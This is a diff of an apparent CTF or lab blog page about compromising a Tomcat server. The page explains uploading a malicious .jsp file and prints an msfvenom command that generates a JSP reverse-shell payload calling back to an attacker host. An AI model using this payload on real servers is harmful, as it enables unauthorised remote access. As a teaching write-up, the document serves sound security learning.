@@ -89,9 +89,9 @@
                             <br>Tomcat is based on java, and can run .jsp file, so let’s try to upload some .jsp file. JSP (Java server page) program is part of a Java web application, it will act like a PHP file, it is used to send a response back to the server in the form of a web page. <br>
                             So let's upload .jsp file on the webserver then run it to open a reverse shield. <br>
 
-                            Using Metasploit, we can create a payload to open a reverse shell when the process is running on the webserver. We know that to run the file, we just have to go to the page and he will automatically run the .jsp file. <br>
+                            Using Msfvenom, we can create a payload to open a reverse shell when the process is running on the webserver. We know that to run the file, we just have to go to the page and he will automatically run the .jsp file. <br>
                             Let's use <strong>Msfvenom</strong> to create the malicious .jsp payload and then we'll upload the file on the webserver. <br>
-                            <br><strong>Msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Your public IP address] LPORT=[Port to received the payload] -f raw > shell.jsp</strong>
+                            <br><strong>Msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Your public IP address] LPORT=[Port to listen] -f raw > shell.jsp</strong>
 
                             <img src="img/WaltersBlog/curlfail.png" class="img-fluid" width="600">
 
